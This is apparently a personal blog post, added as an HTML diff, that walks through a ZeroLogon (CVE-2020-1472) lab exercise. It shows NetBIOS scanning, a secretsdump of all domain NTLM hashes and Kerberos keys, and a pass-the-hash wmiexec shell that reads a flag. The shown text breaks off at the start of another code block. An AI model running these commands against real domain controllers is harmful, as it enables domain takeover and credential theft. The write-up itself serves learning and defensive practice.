@@ -1,0 +1,810 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="ZeroLogon 练习\r先利用NetBIOS协议进行网络层扫描\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nbtscan 192.168.111.100 Doing NBT name scan for addresses from 192.168.111.100 IP address NetBIOS Name Server User MAC address ------------------------------------------------------------------------------ 192.168.111.100 MASTERPC &lt;server&gt; &lt;unknown&gt; 00:50:56:b1:89:24 nbtscan-unixwiz：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nbtscan-unixwiz -n 192.168.111.100 192.168.111.100 MYD\\MASTERPC SHARING DC ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nmblookup -A 192.168.111.100 Looking up status of 192.168.111.100 MYD &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; MASTERPC &lt;00&gt; - B &lt;ACTIVE&gt; MYD &lt;1c&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; MASTERPC &lt;20&gt; - B &lt;ACTIVE&gt; MYD &lt;1b&gt; - B &lt;ACTIVE&gt; MAC Address = 00-50-56-B1-89-24 利用cve-2020-1472来置空域控hash，置空之后就可以用 secretsdump.py 来抓取域管hash\n">
+<title>ZeroLogon 练习</title>
+
+<link rel='canonical' href='https://Oight.github.io/p/zerologon-%E7%BB%83%E4%B9%A0/'>
+
+<link rel="stylesheet" href="/scss/style.min.0e9b0dc41309ee439f307e94fe233ae09b70f32858267ed1afae44d0ba448205.css"><meta property='og:title' content="ZeroLogon 练习">
+<meta property='og:description' content="ZeroLogon 练习\r先利用NetBIOS协议进行网络层扫描\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nbtscan 192.168.111.100 Doing NBT name scan for addresses from 192.168.111.100 IP address NetBIOS Name Server User MAC address ------------------------------------------------------------------------------ 192.168.111.100 MASTERPC &lt;server&gt; &lt;unknown&gt; 00:50:56:b1:89:24 nbtscan-unixwiz：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nbtscan-unixwiz -n 192.168.111.100 192.168.111.100 MYD\\MASTERPC SHARING DC ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nmblookup -A 192.168.111.100 Looking up status of 192.168.111.100 MYD &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; MASTERPC &lt;00&gt; - B &lt;ACTIVE&gt; MYD &lt;1c&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; MASTERPC &lt;20&gt; - B &lt;ACTIVE&gt; MYD &lt;1b&gt; - B &lt;ACTIVE&gt; MAC Address = 00-50-56-B1-89-24 利用cve-2020-1472来置空域控hash，置空之后就可以用 secretsdump.py 来抓取域管hash\n">
+<meta property='og:url' content='https://Oight.github.io/p/zerologon-%E7%BB%83%E4%B9%A0/'>
+<meta property='og:site_name' content='Oight'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2026-05-07T10:29:47&#43;08:00'/><meta property='article:modified_time' content='2026-05-07T10:29:47&#43;08:00'/>
+<meta name="twitter:title" content="ZeroLogon 练习">
+<meta name="twitter:description" content="ZeroLogon 练习\r先利用NetBIOS协议进行网络层扫描\n1 2 3 4 5 6 7 ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nbtscan 192.168.111.100 Doing NBT name scan for addresses from 192.168.111.100 IP address NetBIOS Name Server User MAC address ------------------------------------------------------------------------------ 192.168.111.100 MASTERPC &lt;server&gt; &lt;unknown&gt; 00:50:56:b1:89:24 nbtscan-unixwiz：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nbtscan-unixwiz -n 192.168.111.100 192.168.111.100 MYD\\MASTERPC SHARING DC ┌──(kali㉿kali)-[~/penetartion/secretsdump.py] └─$ nmblookup -A 192.168.111.100 Looking up status of 192.168.111.100 MYD &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; MASTERPC &lt;00&gt; - B &lt;ACTIVE&gt; MYD &lt;1c&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; MASTERPC &lt;20&gt; - B &lt;ACTIVE&gt; MYD &lt;1b&gt; - B &lt;ACTIVE&gt; MAC Address = 00-50-56-B1-89-24 利用cve-2020-1472来置空域控hash，置空之后就可以用 secretsdump.py 来抓取域管hash\n">
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_37edead8cd3c258e.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🐧</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Oight</a></h1>
+            <h2 class="site-description">Talk is cheap. Show me the code.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/696224138'
+                        target="_blank"
+                        title="bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg  xmlns="http://www.w3.org/2000/svg"  width="24"  height="24"  viewBox="0 0 24 24"  fill="none"  stroke="currentColor"  stroke-width="2"  stroke-linecap="round"  stroke-linejoin="round"  class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 0 1 4 -4h10a4 4 0 0 1 4 4v6a4 4 0 0 1 -4 4h-10a4 4 0 0 1 -4 -4v-6z" /><path d="M8 3l2 3" /><path d="M16 3l-2 3" /><path d="M9 13v-2" /><path d="M15 11v2" /></svg>
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/Oight'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友情链接</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E6%B8%97%E9%80%8F/" >
+                渗透
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/zerologon-%E7%BB%83%E4%B9%A0/">ZeroLogon 练习</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">2026-05-07</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 4 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="zerologon-练习">ZeroLogon 练习
+</h1><p>先利用NetBIOS协议进行网络层扫描</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/penetartion/secretsdump.py<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nbtscan 192.168.111.100
+</span></span><span class="line"><span class="cl">Doing NBT name scan <span class="k">for</span> addresses from 192.168.111.100
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">IP address       NetBIOS Name     Server    User             MAC address      
+</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">192.168.111.100  MASTERPC         &lt;server&gt;  &lt;unknown&gt;        00:50:56:b1:89:24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>nbtscan-unixwiz：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/penetartion/secretsdump.py<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nbtscan-unixwiz -n 192.168.111.100
+</span></span><span class="line"><span class="cl">192.168.111.100 MYD<span class="se">\M</span>ASTERPC                    SHARING DC
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/penetartion/secretsdump.py<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nmblookup -A 192.168.111.100
+</span></span><span class="line"><span class="cl">Looking up status of 192.168.111.100
+</span></span><span class="line"><span class="cl">        MYD             &lt;00&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
+</span></span><span class="line"><span class="cl">        MASTERPC        &lt;00&gt; -         B &lt;ACTIVE&gt; 
+</span></span><span class="line"><span class="cl">        MYD             &lt;1c&gt; - &lt;GROUP&gt; B &lt;ACTIVE&gt; 
+</span></span><span class="line"><span class="cl">        MASTERPC        &lt;20&gt; -         B &lt;ACTIVE&gt; 
+</span></span><span class="line"><span class="cl">        MYD             &lt;1b&gt; -         B &lt;ACTIVE&gt; 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        MAC <span class="nv">Address</span> <span class="o">=</span> 00-50-56-B1-89-24
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>利用cve-2020-1472来置空域控hash，置空之后就可以用 secretsdump.py 来抓取域管hash</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/penetartion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ impacket-secretsdump -no-pass myd.com/masterpc<span class="se">\$</span>@192.168.111.100
+</span></span><span class="line"><span class="cl">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Dumping Domain Credentials <span class="o">(</span>domain<span class="se">\u</span>id:rid:lmhash:nthash<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec0df45863a3751d56ba6df1e72f7218:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5d6179aa303cb80767dd808af8e7949b:::
+</span></span><span class="line"><span class="cl">DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">masteruser:1000:aad3b435b51404eeaad3b435b51404ee:ec0df45863a3751d56ba6df1e72f7218:::
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\a</span>lex:1107:aad3b435b51404eeaad3b435b51404ee:d92b40c276ae016de921403adf6e2714:::
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\t</span>om:1112:aad3b435b51404eeaad3b435b51404ee:d92b40c276ae016de921403adf6e2714:::
+</span></span><span class="line"><span class="cl">MASTERPC$:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">WIN7PC$:1104:aad3b435b51404eeaad3b435b51404ee:fba0ef9bd33b6d683c4c5afef2420347:::
+</span></span><span class="line"><span class="cl">WIN10PC$:1108:aad3b435b51404eeaad3b435b51404ee:b80ec1bd8d779daf7c8aba0df0b0b3a5:::
+</span></span><span class="line"><span class="cl">BACKUPPC$:1110:aad3b435b51404eeaad3b435b51404ee:0a24d18aa71033fc7475b36374cfa646:::
+</span></span><span class="line"><span class="cl">SER12PC$:1113:aad3b435b51404eeaad3b435b51404ee:821d0d4ef0c0af19fb9ae76fb2423aaf:::
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Kerberos keys grabbed
+</span></span><span class="line"><span class="cl">krbtgt:aes256-cts-hmac-sha1-96:673497346e4a840a2937edc9f20c9dadf8e3fa36762f8a80d10dc6c899fd30bd
+</span></span><span class="line"><span class="cl">krbtgt:aes128-cts-hmac-sha1-96:2f8352e16bd2241be1654915d81a2d7d
+</span></span><span class="line"><span class="cl">krbtgt:des-cbc-md5:8331fb76e96d1ab6
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\a</span>lex:aes256-cts-hmac-sha1-96:95e2507abb2745ac5c3bf174b623848fbf575e30b3ce5e5004d961c45523560f
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\a</span>lex:aes128-cts-hmac-sha1-96:6d03b9b5f98c3121ebd1e2df6473f851
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\a</span>lex:des-cbc-md5:a4674c8f9dd640cd
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\t</span>om:aes256-cts-hmac-sha1-96:ee3384a48741df4ac23638b1bda36376e1d48385915f8381ae7c3520eaa6b3c9
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\t</span>om:aes128-cts-hmac-sha1-96:77a2c45be49f9b67c29971e111d77219
+</span></span><span class="line"><span class="cl">myd.com<span class="se">\t</span>om:des-cbc-md5:ae8ccb19cd0ed675
+</span></span><span class="line"><span class="cl">MASTERPC$:aes256-cts-hmac-sha1-96:3054d8539c1cc2ad543e5122911c20741dac437a06f0ec91926d8fdea6c4892a
+</span></span><span class="line"><span class="cl">MASTERPC$:aes128-cts-hmac-sha1-96:59b4146c6c92b85853c2463904da4fd3
+</span></span><span class="line"><span class="cl">MASTERPC$:des-cbc-md5:d34f02fd58dc5e79
+</span></span><span class="line"><span class="cl">WIN7PC$:aes256-cts-hmac-sha1-96:0ce42c9e2b4dae863e9c89fcb544044b6ad0ab163a9c5ec0654a387188401758
+</span></span><span class="line"><span class="cl">WIN7PC$:aes128-cts-hmac-sha1-96:cf5f272afedad5da97673bb134f8e624
+</span></span><span class="line"><span class="cl">WIN7PC$:des-cbc-md5:f13e5415b6e00db6
+</span></span><span class="line"><span class="cl">WIN10PC$:aes256-cts-hmac-sha1-96:ca924d18a9cb0e0c0b18c8ef2d3cf570ba9a387ffa066b7d0c594183fa0c44ba
+</span></span><span class="line"><span class="cl">WIN10PC$:aes128-cts-hmac-sha1-96:22d54361b292d21d619a14c0da816ed6
+</span></span><span class="line"><span class="cl">WIN10PC$:des-cbc-md5:bc6ee3dc3e851934
+</span></span><span class="line"><span class="cl">BACKUPPC$:aes256-cts-hmac-sha1-96:2e19705625a7e08e20cd7b817ed4168a36535ce97f7b2d66621b47d092697135
+</span></span><span class="line"><span class="cl">BACKUPPC$:aes128-cts-hmac-sha1-96:b6a9c337be3415c0290988821199544c
+</span></span><span class="line"><span class="cl">BACKUPPC$:des-cbc-md5:ae4601f851c76145
+</span></span><span class="line"><span class="cl">SER12PC$:aes256-cts-hmac-sha1-96:4b23645c727fad5699b4adb4b44e92b1813e97026c8cb4fbba99db984e8585b1
+</span></span><span class="line"><span class="cl">SER12PC$:aes128-cts-hmac-sha1-96:9b01c72dbc5f89c4c7d13038715a9bf8
+</span></span><span class="line"><span class="cl">SER12PC$:des-cbc-md5:3d1a1ada68c72f9e
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Cleaning up... 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>抓取到了所有用户的hash</p>
+<p>然后进行PTH(Pass-The-Hash)攻击，使用wmiexec.py进行登录，生成一个半交互式shell(管理员权限)：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/penetartion<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:ec0df45863a3751d56ba6df1e72f7218 myd.com/Administrator@192.168.111.100 
+</span></span><span class="line"><span class="cl">Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> SMBv3.0 dialect used
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Launching semi-interactive shell - Careful what you execute
+</span></span><span class="line"><span class="cl"><span class="o">[</span>!<span class="o">]</span> Press <span class="nb">help</span> <span class="k">for</span> extra shell commands
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\&gt;</span>dir
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Decoding error detected, consider running chcp.com at the target,
+</span></span><span class="line"><span class="cl">map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+</span></span><span class="line"><span class="cl">and <span class="k">then</span> execute wmiexec.py again with -codec and the corresponding codec
+</span></span><span class="line"><span class="cl"> ������ C �еľ�û�б�ǩ��
+</span></span><span class="line"><span class="cl"> �������к��� 9ACC-3F8E
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> C:<span class="se">\ </span>��Ŀ¼
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">2025/11/27  17:13                <span class="m">32</span> flag.txt
+</span></span><span class="line"><span class="cl">2016/07/16  21:23    &lt;DIR&gt;          PerfLogs
+</span></span><span class="line"><span class="cl">2026/05/02  11:40    &lt;DIR&gt;          Program Files
+</span></span><span class="line"><span class="cl">2024/08/10  10:08    &lt;DIR&gt;          Program Files <span class="o">(</span>x86<span class="o">)</span>
+</span></span><span class="line"><span class="cl">2024/08/18  21:24    &lt;DIR&gt;          Users
+</span></span><span class="line"><span class="cl">2026/05/02  13:25    &lt;DIR&gt;          Windows
+</span></span><span class="line"><span class="cl">               <span class="m">1</span> ���ļ�             <span class="m">32</span> �ֽ�
+</span></span><span class="line"><span class="cl">               <span class="m">5</span> ��Ŀ¼ 49,410,732,032 �����ֽ�
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">C:<span class="se">\&gt;</span><span class="nb">type</span> flag.txt
+</span></span><span class="line"><span class="cl">48255d2fc759b14f4127fda7c5a86d89
+</span></span><span class="line"><span class="cl">C:<span class="se">\&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
